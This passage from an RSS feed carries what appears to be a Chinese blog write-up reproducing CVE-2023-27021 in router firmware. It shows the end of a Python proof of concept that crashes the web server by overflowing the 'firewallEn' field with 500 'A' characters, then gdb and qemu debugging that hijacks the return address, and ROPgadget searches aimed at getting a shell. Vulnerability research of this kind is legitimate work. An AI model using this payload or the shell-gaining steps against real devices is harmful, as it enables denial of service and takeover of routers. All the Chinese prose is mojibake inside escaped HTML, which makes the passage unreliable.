punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;password=hdjcvb&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;A&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;firewallEn&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;header&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;æ‰§è¡Œ POC åï¼š&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100524266.png&#34; alt=&#34;image-20240509100524266&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100543004.png&#34; alt=&#34;image-20240509100543004&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100606754.png&#34; alt=&#34;image-20240509100606754&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å¯ä»¥å¾—çŸ¥å­˜åœ¨æ‹’ç»æœåŠ¡æ¼æ´ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åˆ©ç”¨æ¼æ´-gdbè°ƒè¯•&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#åˆ©ç”¨æ¼æ´-gdbè°ƒè¯•&#34;&gt;#&lt;/a&gt; åˆ©ç”¨æ¼æ´ - gdb è°ƒè¯•&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509075854662.png&#34; alt=&#34;image-20240509075854662&#34;&gt;&lt;/p&gt;
&lt;p&gt;æµ‹è¯•æ¼æ´çš„ä¿æŠ¤&lt;/p&gt;
&lt;p&gt;å› ä¸º NX ä¿æŠ¤å¼€å¯ï¼Œæ— æ³•å‘æ ˆä¸Šå†™å…¥ shellcode å»æ‰§è¡Œã€‚å¯ä»¥å»åˆ©ç”¨ ropï¼Œå»è¿›è¡Œè·å– shell&lt;/p&gt;
&lt;h4 id=&#34;é…ç½®gdbåŠ¨æ€è°ƒè¯•ç¯å¢ƒ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#é…ç½®gdbåŠ¨æ€è°ƒè¯•ç¯å¢ƒ&#34;&gt;#&lt;/a&gt; é…ç½® gdb åŠ¨æ€è°ƒè¯•ç¯å¢ƒ&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo chroot ./ ./qemu-arm-static -g 9999 ./bin/httpd&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¼€å¯å¦ä¸€ä¸ªç»ˆç«¯&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gdb-multiarch ./bin/httpd&lt;/p&gt;
&lt;p&gt;pwndbg&amp;gt; set architecture arm&lt;/p&gt;
&lt;p&gt;pwndbg&amp;gt; target remote :9999&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo lsof -i :9999 æŸ¥çœ‹ gdb ç»‘å®šç«¯å£çš„ PID&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å»è°ƒè¯•ç¨‹åºäº†&lt;/p&gt;
&lt;h4 id=&#34;åˆ©ç”¨pocå»åŠ«æŒret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#åˆ©ç”¨pocå»åŠ«æŒret&#34;&gt;#&lt;/a&gt; åˆ©ç”¨ POC å»åŠ«æŒ ret&lt;/h4&gt;
&lt;p&gt;è¿›å…¥ gdb è°ƒè¯•åæˆ‘ä»¬å…ˆ n ä¸Šä¸¤æ­¥ï¼Œç„¶åæ‰§è¡Œ POC ä¸¤æ¬¡ï¼Œè§‚æµ‹ gdb&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509102326859.png&#34; alt=&#34;image-20240509102326859&#34;&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°è¿”å›åœ°å€ç¡®å®è¢«æˆ‘ä»¬å»åŠ«æŒåˆ°ä¸€ä¸ªæˆ‘ä»¬äººä¸ºè¾“å…¥çš„å€¼ã€‚æ¥ä¸‹æ¥å°±æ˜¯æµ‹è¯•æˆ‘ä»¬å¦‚ä½•å°†è¿™ä¸ªæ”¹æˆä¸€ä¸ªå¯è·å– shell çš„ rop&lt;/p&gt;
&lt;h3 id=&#34;åˆ©ç”¨æ¼æ´-è·å–shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#åˆ©ç”¨æ¼æ´-è·å–shell&#34;&gt;#&lt;/a&gt; åˆ©ç”¨æ¼æ´ - è·å– shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;è·å–è¿”å›åœ°å€æ®è¾“å…¥åç§»é‡&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509103042769.png&#34; alt=&#34;image-20240509103042769&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;å¯»æ‰¾ libc åŸºå€&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½¿ç”¨ vmmap çœ‹å†…å­˜ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509103454383.png&#34; alt=&#34;image-20240509103454383&#34;&gt;&lt;/p&gt;
&lt;p&gt;çŒœæµ‹ç®­å¤´æ‰€æŒ‡å‡ºä¸º libc åŸºå€ã€‚&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;å¯»æ‰¾ gadget&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;ä½¿ç”¨ ROPgadgetï¼Œåœ¨ libc ä¸­æ‰¾ä¸€ä¸ªå¯ä»¥æ§åˆ¶ r0 çš„ gadget&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary ./lib/libc.so.0 | grep &amp;quot;mov r0, sp&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509104401520.png&#34; alt=&#34;image-20240509104401520&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å†åœ¨ libc ä¸­æ‰¾ä¸€ä¸ªå¯ä»¥ pop åˆ° r3 çš„ gadget&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary ./lib/libc.so.0 --only &amp;quot;pop&amp;quot;|grep r3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509104744796.png&#34; alt=&#34;image-20240509104744796&#34;&gt;&lt;/p&gt;
&lt;p&gt;åç»­è¡¥å……â€¦&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
